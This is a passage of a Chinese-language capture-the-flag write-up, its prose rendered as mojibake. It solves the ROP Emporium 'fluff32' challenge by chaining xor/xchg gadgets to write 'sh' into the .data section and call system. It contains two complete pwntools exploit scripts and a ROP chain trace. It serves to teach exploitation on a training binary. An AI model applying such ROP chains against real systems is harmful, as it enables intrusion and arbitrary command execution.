<p>è¿™ä¸ªå¼‚æˆ–ä¼šæŠŠç»“æœæ”¾è¿› <code class="docutils literal notranslate"><span class="pre">edx</span></code>ï¼Œè¦ä¹ˆèƒ½æ‰¾åˆ° <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code> å’Œ <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">ebx,ebx</span></code> è¦ä¹ˆ <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx</span></code> å’Œ <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code></p>
<p>å‘ç°äº†å—ï¼Œè·Ÿè®¾ç½® ecx çš„æŸäº›æ­¥éª¤é‡å äº†</p>
<p>æœ‰ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048670 5f         POP     EDI
   08048671 31 d2      XOR     EDX,EDX
   08048673 5e         POP     ESI
   08048674 bd be      MOV     EBP,0xcafebabe
            ba fe ca
   08048679 c3         RET
</pre></div>
</div>
<p>ROPgadget æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx;</span> <span class="pre">ret</span></code></p>
<p><img alt="image-20200503182259756" src="../_images/image-20200503182259756.png" /></p>
<p>æ¼æ´ç‚¹</p>
<p><img alt="image-20200503184206069" src="../_images/image-20200503184206069.png" /></p>
<p>å¡«å……é•¿åº¦ï¼š<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span></code></p>
<p>å¥½äº†ï¼Œå¯ä»¥å†™ payload äº†ï¼š</p>
<p>é€†åºçœ‹æ‰¾ gadget çš„æ­¥éª¤ï¼Œåªèƒ½å…ˆè®¾ç½® ecx çš„å€¼ï¼Œå› ä¸ºå…ˆè®¾ç½® edx çš„è¯æˆ‘ä»¬æ²¡åŠæ³•æ¸…ç©ºè®¾ç½® edx æ—¶ ecx è®¾ç½®çš„å€¼</p>
<p>è®¾ç½® ecxï¼Œecx æ˜¯è¦è®¾ç½®ä¸€ä¸ªå¯å†™å¯è¯»çš„å†…å­˜çš„èµ·å§‹åœ°å€</p>
<p><img alt="image-20200503185850631" src="../_images/image-20200503185850631.png" /></p>
<p>data æ®µå¯ä»¥ï¼Œåœ°å€ï¼š<code class="docutils literal notranslate"><span class="pre">0x0804a028</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>
<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x0804a028</span>
<span class="n">pop_ebx_ret</span> <span class="o">=</span> <span class="mh">0x080483e1</span>
<span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span> <span class="o">=</span> <span class="mh">0x08048670</span>
<span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867a</span>
<span class="n">xchg_edx_ecx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08048689</span>
<span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span> <span class="o">=</span> <span class="mh">0x08048692</span>

<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xchg_edx_ecx_pop_ebp_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p><code class="docutils literal notranslate"><span class="pre">gdb</span> <span class="pre">attach</span></code> ä¸Šå»çœ‹ä¸€ä¸‹ <code class="docutils literal notranslate"><span class="pre">ecx</span></code> çš„ç½®æœ‰æ²¡æœ‰æˆåŠŸè®¾ç½®</p>
<p><img alt="image-20200503191912942" src="../_images/image-20200503191912942.png" /></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæ„é€ çš„ ROP é“¾æˆåŠŸè®¾ç½®äº† ecx çš„å€¼ä¸º data_section</p>
<p>ç°åœ¨ å¼€å§‹å†™ è®¾ç½® ebx çš„é‚£éƒ¨åˆ† payload</p>
<p>ç°åœ¨çš„ edx è¢«æ±¡æŸ“äº†ï¼Œéœ€è¦æ¸…ç©ºï¼Œè°ƒç”¨ <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code> å°±èƒ½æ¸…ç©º <code class="docutils literal notranslate"><span class="pre">edx</span></code>ï¼ˆè‡ªå·±å’Œè‡ªå·±å¼‚æˆ–è‚¯å®šç­‰äº 0 å•Šï¼‰</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048671 31 d2      XOR     EDX,EDX
   08048673 5e         POP     ESI
   08048674 bd be      MOV     EBP,0xcafebabe
            ba fe ca
   08048679 c3         RET
</pre></div>
</div>
<p>è¿™ä¸ªå¯ä»¥ï¼Œokï¼Œå†™</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>
<span class="n">fluff32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>

<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;sh</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
<span class="n">system_plt</span> <span class="o">=</span> <span class="n">fluff32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x0804a028</span>

<span class="n">pop_ebx_ret</span> <span class="o">=</span> <span class="mh">0x080483e1</span>
<span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span> <span class="o">=</span> <span class="mh">0x08048670</span>
<span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867a</span>
<span class="n">xchg_edx_ecx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08048689</span>
<span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span> <span class="o">=</span> <span class="mh">0x08048692</span>

<span class="n">xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867b</span>


<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xchg_edx_ecx_pop_ebp_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="p">(</span><span class="n">sh</span><span class="p">)</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&quot;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>


<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>ROP æ±‡ç¼–ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0x804864b &lt;pwnme+85&gt;                  ret    
    â†“
   0x80483e1 &lt;_init+33&gt;                  pop    ebx
   0x80483e2 &lt;_init+34&gt;                  ret    
    â†“
   0x8048670 &lt;questionableGadgets&gt;       pop    edi
   0x8048671 &lt;questionableGadgets+1&gt;     xor    edx, edx
   0x8048673 &lt;questionableGadgets+3&gt;     pop    esi
   0x8048674 &lt;questionableGadgets+4&gt;     mov    ebp, 0xcafebabe
   0x8048679 &lt;questionableGadgets+9&gt;     ret    
     â†“
   0x804867a &lt;questionableGadgets+10&gt;    pop    esi
   0x804867b &lt;questionableGadgets+11&gt;    xor    edx, ebx
   0x804867d &lt;questionableGadgets+13&gt;    pop    ebp
   0x804867e &lt;questionableGadgets+14&gt;    mov    edi, 0xdeadbabe
   0x8048683 &lt;questionableGadgets+19&gt;    ret    
    â†“
   0x8048689 &lt;questionableGadgets+25&gt;    xchg   edx, ecx
   0x804868b &lt;questionableGadgets+27&gt;    pop    ebp
   0x804868c &lt;questionableGadgets+28&gt;    mov    edx, 0xdefaced0
   0x8048691 &lt;questionableGadgets+33&gt;    ret    
    â†“
   0x80483e1 &lt;_init+33&gt;                  pop    ebx
   0x80483e2 &lt;_init+34&gt;                  ret    
    â†“
   0x8048670 &lt;questionableGadgets&gt;       pop    edi
   0x8048671 &lt;questionableGadgets+1&gt;     xor    edx, edx
   0x8048673 &lt;questionableGadgets+3&gt;     pop    esi
   0x8048674 &lt;questionableGadgets+4&gt;     mov    ebp, 0xcafebabe
   0x8048679 &lt;questionableGadgets+9&gt;     ret    
    â†“
   0x804867b &lt;questionableGadgets+11&gt;    xor    edx, ebx
   0x804867d &lt;questionableGadgets+13&gt;    pop    ebp
   0x804867e &lt;questionableGadgets+14&gt;    mov    edi, 0xdeadbabe
   0x8048683 &lt;questionableGadgets+19&gt;    ret    
    â†“
   0x8048692 &lt;questionableGadgets+34&gt;    pop    edi
   0x8048693 &lt;questionableGadgets+35&gt;    mov    dword ptr [ecx], edx
   0x8048693 &lt;questionableGadgets+35&gt;    mov    dword ptr [ecx], edx
   0x8048695 &lt;questionableGadgets+37&gt;    pop    ebp
   0x8048696 &lt;questionableGadgets+38&gt;    pop    ebx
   0x8048697 &lt;questionableGadgets+39&gt;    xor    byte ptr [ecx], bl
   0x8048699 &lt;questionableGadgets+41&gt;    ret    
    â†“
   0x8048430 &lt;system@plt&gt;                jmp    dword ptr [system@got.plt] &lt;0x804a018&gt;
</pre></div>
</div>
<p>æˆåŠŸè®¾ç½® <code class="docutils literal notranslate"><span class="pre">ecx</span></code> å’Œ <code class="docutils literal notranslate"><span class="pre">edx</span></code> çš„å€¼</p>
<p><img alt="image-20200503203556821" src="../_images/image-20200503203556821.png" /></p>
<p><img alt="image-20200503203739489" src="../_images/image-20200503203739489.png" /></p>
<p>pwn!</p>
</section>
</section>


           </div>
          </div>
          <footer>

  <hr/>

  <div role="contentinfo">
    <p>&#169; ç‰ˆæƒæ‰€æœ‰ 2021, scriptk1d.</p>
  </div>

  åˆ©ç”¨ <a href="https://www.sphinx-doc.org/">Sphinx</a> æ„å»ºï¼Œä½¿ç”¨äº† 
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">ä¸»é¢˜</a>
    ç”± <a href="https://readthedocs.org">Read the Docs</a>å¼€å‘.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>